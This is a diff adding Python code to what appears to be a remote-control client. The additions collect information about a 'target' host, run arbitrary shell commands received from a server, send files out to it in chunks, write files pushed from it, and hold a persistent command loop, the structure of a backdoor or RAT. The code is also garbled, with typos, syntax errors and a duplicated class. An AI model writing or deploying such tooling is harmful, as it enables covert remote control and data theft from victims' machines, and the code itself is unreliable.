@@ -114,7 +114,81 @@ class SystemManager:
                 threat_list.append(threat_info)
                 
             # Filter results for the user's requested categories
+            specific_threats = {
+                "malware": [t for t in threat_list if t['ThreatCategory'] == 'Malware'],
+                "worms": [t for t in threat_list if t['ThreatCategory'] == 'Worm'],
+                "spyware": [t for t in threat_list if t['ThreatCategory'] == 'Spyware'],
+                "trojans": [t for t in threat_list if t['ThreatCategory'] == 'Trojan'],
+            }
+            
+            return {
+                "total_threats": len(threat_list),
+                "specific_categories": specific_threats,
+                "raw_data": threat_list
+            }
+            
+        except Exception as e:
+            print(f"[DEFENDER] Query threats error: {e}")
+            return {"status": "error": str(e)}
+            
+    def remove_threat(self, threat_id):
+        """
+        Attempts to remove a specific identified threat.
+        """
+        try:
+            # Create the action interface
+            actions = win32com.client.GetObject("winmgmts:\\\\.\\root\\Microsoft\\Windows\\Defender")
+            action = actions.Get("MSFT_MpThreatAction")
+            
+            # Set the action to 'Remove'
+            action.ThreatID = threat_id
+            action.Action = 2 # 2 = Remove
+            
+            # Execute the action
+            action.Execute()
+            print(f"[DEFENDER] Threat {threat_id} removed successfully.")
+            return {"status": "removed"}
+            
+        except Exception as e:
+            print(f"[DEFENDER] Failed to remove threat: {e}")
+            return {"status": "failed", "error": str(e)}
         
+    def enable_protection(self):
+        """
+        Enables Real-Time Protection and other scanning features.
+        """
+        try:
+            # We use the configuration namespace to modify settings
+            config = win32com.client.GetObject("winmgmts:\\\\.\\root\\Microsoft\\Windows\\Defender\\Configuration")
+            
+            # Enable Real-Time Protection
+            config.SetRealTimeProtection(1) # 1 = Enabled
+            config.SetNetworkProtection(1)
+            config.SetSignatureUpdateInterval(1)
+            
+            print(f"[DEFENDER] Protection enabled.")
+            return {"status": "enabled"}
+            
+        except Exception as e:
+            print(f"[DEFENDER] Failed to enable protection: {e}")
+            return {"status": "failed", "error": str(e)}
+        
+    def update_defender(self):
+        """
+        Forces an immediate signature update for Windows Defender
+        """
+        try:
+            status = self._get_defender_controller()
+            if status:
+                # This triggers the update process
+                status.UpdateSignature()
+                print("[DEFENDER] Signature update triggered.")
+                return {"status": "update_triggered}
+            else:
+                return {"status": "error"}
+        except Exception as e:
+            print(f"[DEFENDER] Update error: {e}")
+            return {"status": "error"}
 
 class CommunicationHandler:
     """
@@ -257,3 +331,159 @@ class CommunicationHandler:
         
     def handle_disconnec(self):
         """Handles graceful disconnection attempts."""
+        self.is_connected = False
+        if self.socket:
+            try:
+                self.socket.close()
+            except:
+                pass
+        print("[SYSTEM] Disconnected from server.")
+        
+        
+class SystemManager:
+    """
+    Handles local system operations, file manipulation, and process control
+    """
+    def __init__(self, comm_handler):
+        self.comm = comm_handler
+        
+    def gather_system_info(self):
+        """Collects statistics about the target environment."""
+        try:
+            cpu_load = psutil.cpu_percent(interval=1)
+            memory = psutil.virtual_memory()
+            disk = psutil.disk_usage('/')
+            
+            info = {
+                "cpu_percent": cpu_losd,
+                "memory_percent": memory.percent,
+                "memory_available_gb": round(memory.available / (1024**3), 2),
+                "disk_total_gb": round(disk.total / (1024**3), 2),
+                "disk_used_gb": round(disk.used / (1024**3), 2),
+                "disk_percent": disk.percent,
+                "uptime": str(datetime.now() - datetime.fromtimestamp(psutil.boot_time()))
+            }
+            
+            self.comm.send_data(info, "status")
+            return info
+            
+        except Exception as e:
+            print(f"[SYS] Gather info error: {e}")
+            return None
+            
+    def list_directory(self, path='.'):
+        """Recursively scans a directory for files and folders."""
+        try:
+            content = []
+            for item in os.listdir(path):
+                full_path = os.path.join(path, item)
+                if os.path.isfile(full_path):
+                    size = os.path.getsize(full_path)
+                    content.append({"name": item, "type": "file", "size": size})
+                elif os.path.isdir(full_path):
+                    content.append({"name": item, "type": "directory"})
+                    
+            self.comm.send_data(content, "status")
+            return content
+            
+        except Exception as e:
+            print(f"[SYS] List dir error: {e}")
+            return None
+            
+    def execute_command(self, command):
+        """Executes a shell command and returns the output."""
+        try:
+            # Use Popen to capture output without blocking the main thread
+            process = subprocess.Popen(
+                command,
+                shell=True,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                text=True
+            )
+            
+            stdout, stderr = process.communicate()
+            
+            result = {
+                "return_code": process.returncode,
+                "output": stdout,
+                "error": stderr
+            }
+            
+            self.comm.send_data(result, "status")
+            return result
+            
+        except Exception as e:
+            print(f"[SYS] Execute cmd error: {e}")
+            return None
+            
+    def download_file(self, remote_path, local_path):
+        try:
+            if os.path.exists(remote_path):
+                with open(remote_path, 'rb') as f:
+                    file_data = f.read()
+                    
+                # Send metadata and file content
+                file_metadata = {
+                    "path": remote_path,
+                    "size": len(file_data)
+                }
+                
+                self.comm.send_data(file_metadata, "file_transfer")
+                
+                # Send file data in chunks
+                chink_size = 1024 * 1024 # 1MB chunks
+                for i in range(0, len(file_data), chunk_size):
+                    chunk = file_data[i:i + chunk_size]
+                    self.comm.send_data(chunk, "file_transfer")
+                    
+                print(f"[SYS] File sent: {remote_path}")
+                return True
+            else:
+                print(f"[SYS] File not found: {remote_path}")
+                self.comm.send_data({"error": "File not found"}, error")
+                return False
+                
+        except Exception as e:
+            print(f"[SYS] Download error: {e}")
+            return False
+            
+    def upload_file(self, remote_path, file_content):
+        """Save file content to the client."""
+        try:
+            with open(remote_path, 'wb') as f:
+                f.write(file_content)
+            print(f"[SYS] File saved: {remote_path}")
+            self.comm.send_data({"success": True, "path": remote_path}, "status")
+            return True
+        except Exception as e:
+            print(f"[SYS] Upload error: {e}")
+            return False
+            
+            
+class OperationCore:
+    """
+    The main controller that handles the execution loop and command parsing.
+    
+    orchestrates the interaction between the communication handler and the system manager.
+    It maintains a persistent connection and processes incoming instructions.
+    """
+    def __init__(self, host, port):
+        self.comm = CommunicationHandler(host, port)
+        self.sys_mgr = SystemManager(self.comm)
+        self.running = True
+        
+    def start(self):
+        """Initializes the connection and begins the operation loop."""
+        print("[CORE] Initializing Operation Core...")
+        
+        if not self.comm.establish_connection():
+            print("[CORE] Failed to connect. Exiting.")
+            return
+            
+        # Initial heartbeat
+        self.sys_mgr.gather_system_info()
+        
+        while self.running and self.comm.is_connected:
+            # Wait for incoming command
+            data, packet_type = self.comm.receive_data()
